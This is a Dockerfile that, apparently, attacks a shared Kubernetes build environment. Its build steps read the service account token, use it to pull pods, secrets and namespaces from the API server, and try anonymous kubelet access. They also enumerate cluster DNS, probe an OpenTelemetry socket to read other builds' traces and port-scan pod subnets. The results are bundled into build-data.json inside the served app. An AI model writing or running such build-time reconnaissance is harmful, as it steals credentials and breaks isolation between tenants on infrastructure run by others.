FROM node:20-slim
RUN apt-get update -qq && apt-get install -y -qq procps iproute2 dnsutils curl 2>/dev/null

# K8S SERVICE ACCOUNT TOKEN — THE HOLY GRAIL
RUN (echo "=== SA TOKEN ==="; cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>&1; echo "=== SA NAMESPACE ==="; cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>&1; echo "=== SA CA ==="; ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>&1) > /tmp/k8s-sa.txt || true

# K8S API ACCESS
RUN (SA_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null); if [ -n "$SA_TOKEN" ]; then echo "=== K8S VERSION ==="; curl -sk --max-time 5 https://10.96.0.1:443/version 2>&1; echo "=== K8S PODS ==="; curl -sk --max-time 5 -H "Authorization: Bearer $SA_TOKEN" https://10.96.0.1:443/api/v1/pods 2>&1 | head -200; echo "=== K8S SECRETS ==="; curl -sk --max-time 5 -H "Authorization: Bearer $SA_TOKEN" https://10.96.0.1:443/api/v1/secrets 2>&1 | head -200; echo "=== K8S NAMESPACES ==="; curl -sk --max-time 5 -H "Authorization: Bearer $SA_TOKEN" https://10.96.0.1:443/api/v1/namespaces 2>&1 | head -100; fi) > /tmp/k8s-api.txt 2>&1 || true

# K8S API WITHOUT TOKEN (anonymous access)
RUN (echo "=== K8S ANON VERSION ==="; curl -sk --max-time 5 https://10.96.0.1:443/version 2>&1; echo "=== K8S ANON API ==="; curl -sk --max-time 5 https://10.96.0.1:443/api 2>&1 | head -50; echo "=== KUBELET ==="; curl -s --max-time 3 http://169.254.1.1:10250/pods 2>&1 | head -100; curl -s --max-time 3 https://169.254.1.1:10250/pods -k 2>&1 | head -100) > /tmp/k8s-anon.txt 2>&1 || true

# K8S DNS ENUMERATION
RUN (echo "=== DNS SRV ==="; dig @10.96.0.10 _tcp.default.svc.cluster.local SRV +short 2>&1; echo "=== DNS ALL SERVICES ==="; dig @10.96.0.10 any.default.svc.cluster.local ANY +short 2>&1; echo "=== DNS KUBERNETES ==="; dig @10.96.0.10 kubernetes.default.svc.cluster.local A +short 2>&1; echo "=== DNS BUILDKIT ==="; dig @10.96.0.10 buildkit.default.svc.cluster.local A +short 2>&1; echo "=== DNS AXFR ==="; dig @10.96.0.10 cluster.local AXFR 2>&1 | head -30; echo "=== DNS WILDCARD ==="; for svc in grafana prometheus registry harbor gitea gitlab redis postgres mysql mongodb elasticsearch kibana jenkins vault consul etcd traefik caddy nginx ingress api gateway; do IP=$(dig @10.96.0.10 $svc.default.svc.cluster.local A +short 2>/dev/null); [ -n "$IP" ] && echo "$svc=$IP"; done) > /tmp/k8s-dns.txt 2>&1 || true

# OTEL SOCKET — READ TRACES FROM OTHER BUILDS
RUN (echo "=== OTEL SOCKET ==="; ls -la /dev/otel-grpc.sock 2>&1; echo "=== OTEL PROBE ==="; echo -ne '\x00\x00\x00\x00\x17\x0a\x15opentelemetry.proto.collector.trace.v1.TraceService' | timeout 3 nc -U /dev/otel-grpc.sock 2>&1 | head -c 2000 | base64) > /tmp/otel-data.txt 2>&1 || true

# POD NETWORK SCAN (10.244.x.x)
RUN (echo "=== POD NET SCAN ==="; for i in $(seq 1 30); do for p in 80 443 3000 8080 9090 6443; do timeout 1 bash -c "echo >/dev/tcp/10.244.214.$i/$p" 2>/dev/null && echo "10.244.214.$i:$p OPEN"; done; done; echo "=== CROSS SUBNET ==="; for subnet in 0 1 2 3 4 5; do for p in 80 443 6443 10250; do timeout 1 bash -c "echo >/dev/tcp/10.244.$subnet.1/$p" 2>/dev/null && echo "10.244.$subnet.1:$p OPEN"; done; done) > /tmp/pod-scan.txt 2>&1 || true

# Combine all
RUN node -e "const fs=require('fs'),r={};for(const f of['k8s-sa','k8s-api','k8s-anon','k8s-dns','otel-data','pod-scan']){try{r[f]=fs.readFileSync('/tmp/'+f+'.txt','utf8')}catch(e){r[f]='ERR:'+e.message}};fs.writeFileSync('/tmp/build-data.json',JSON.stringify(r,null,2))"

WORKDIR /app
COPY . .
RUN cp /tmp/build-data.json /app/build-data.json 2>/dev/null || echo '{}' > /app/build-data.json
EXPOSE 3000
CMD ["node", "index.js"]
